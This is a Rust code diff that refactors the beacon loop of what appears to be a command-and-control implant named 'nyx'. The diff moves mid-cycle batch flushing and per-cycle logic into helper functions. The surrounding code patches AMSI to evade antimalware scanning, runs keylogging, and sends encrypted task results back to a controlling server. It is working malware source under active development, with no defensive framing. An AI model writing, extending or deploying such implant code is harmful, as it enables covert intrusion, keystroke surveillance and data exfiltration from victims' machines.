@@ -414,30 +414,45 @@ unsafe fn beacon_dispatch_tasks(
                 response,
             });
             // Flush mid-cycle if batch nears frame cap.
-            if pending_batch_size(pending) > BATCH_FLUSH {
-                let frame = match encode_frame_dir(
-                    pubkey,
-                    Direction::ClientToServer,
-                    *counter,
-                    key,
-                    &encode_batch(pending),
-                ) {
-                    Ok(f) => f,
-                    Err(_) => continue,
-                };
-                let sent = crate::channels::dispatch_send_recv(
-                    ch_ctx,
-                    crate::channels::get_active(),
-                    &frame,
-                );
-                if sent.is_some() {
-                    *counter += 1;
-                    pending.clear();
-                }
-            }
+            beacon_dispatch_flush(pubkey, counter, key, pending, ch_ctx);
         }
     }
     true
+}
+
+/// Flush mid-cycle if the pending batch nears the frame cap. On encode or
+/// send failure the batch is kept (and the counter unchanged) so the next
+/// cycle re-encodes and retries it — mirrors the oneshot and end-of-cycle
+/// flushes.
+fn beacon_dispatch_flush(
+    pubkey: &[u8; 32],
+    counter: &mut u64,
+    key: &nyx_protocol::crypto::SessionKey,
+    pending: &mut Vec<TaskResponse>,
+    ch_ctx: &crate::channels::ChannelCtx,
+) {
+    if pending_batch_size(pending) > BATCH_FLUSH {
+        let frame = match encode_frame_dir(
+            pubkey,
+            Direction::ClientToServer,
+            *counter,
+            key,
+            &encode_batch(pending),
+        ) {
+            Ok(f) => f,
+            Err(_) => return,
+        };
+        // SAFETY: same contract as the beacon_loop call sites — `ch_ctx`
+        // outlives the call and the active channel's fns were resolved at
+        // bootstrap.
+        let sent = unsafe {
+            crate::channels::dispatch_send_recv(ch_ctx, crate::channels::get_active(), &frame)
+        };
+        if sent.is_some() {
+            *counter += 1;
+            pending.clear();
+        }
+    }
 }
 
 // ── Main loop ───────────────────────────────────────────────────────────────
@@ -480,31 +495,54 @@ pub unsafe fn beacon_loop() -> u32 {
     let mut cycle: u32 = 0;
     let mut amsi_patched = false;
     loop {
-        // Per-cycle setup: kill-date, AMSI, sleep, keylog, channel drain.
-        if !beacon_cycle_setup(&implant, &mut cycle, &mut amsi_patched, &cfg, &mut pending) {
-            return 0x00; // kill-date reached — deliberate clean stop
-        }
-
-        // Encode + send pending batch, receive server reply.
-        let Some(body) = beacon_send_frame(&pubkey, &mut counter, &key, &mut pending, &ch_ctx)
-        else {
-            continue;
-        };
-
-        // Decode reply, dispatch tasks, flush mid-cycle.
-        if !beacon_dispatch_tasks(
-            &body,
-            &key,
+        if !beacon_loop_cycle(
+            &implant,
+            &mut cycle,
+            &mut amsi_patched,
+            &cfg,
+            &mut pending,
             &pubkey,
             &mut counter,
-            &cfg,
-            rt,
+            &key,
             &ch_ctx,
-            &mut pending,
+            rt,
         ) {
-            return 0x00; // Exit task received — deliberate clean stop
+            return 0x00; // kill-date reached or Exit task — deliberate clean stop
         }
     }
+}
+
+/// One beacon cycle: per-cycle setup (kill-date, AMSI, sleep, keylog,
+/// channel drain), encode+send the pending batch, and dispatch the server
+/// reply. Returns false when the loop should stop (kill-date reached or
+/// `Exit` task received).
+unsafe fn beacon_loop_cycle(
+    implant: &ImplantConfig,
+    cycle: &mut u32,
+    amsi_patched: &mut bool,
+    cfg: &Config,
+    pending: &mut Vec<TaskResponse>,
+    pubkey: &[u8; 32],
+    counter: &mut u64,
+    key: &nyx_protocol::crypto::SessionKey,
+    ch_ctx: &crate::channels::ChannelCtx,
+    rt: Option<&'static crate::syscalls::Runtime>,
+) -> bool {
+    // Per-cycle setup: kill-date, AMSI, sleep, keylog, channel drain.
+    if !beacon_cycle_setup(implant, cycle, amsi_patched, cfg, pending) {
+        return false; // kill-date reached — deliberate clean stop
+    }
+
+    // Encode + send pending batch, receive server reply.
+    let Some(body) = beacon_send_frame(pubkey, counter, key, pending, ch_ctx) else {
+        return true; // send failed — retry next cycle
+    };
+
+    // Decode reply, dispatch tasks, flush mid-cycle.
+    if !beacon_dispatch_tasks(&body, key, pubkey, counter, cfg, rt, ch_ctx, pending) {
+        return false; // Exit task received — deliberate clean stop
+    }
+    true
 }
 
 /// **Integration-test entry**: run the real beacon check-in + ONE task cycle
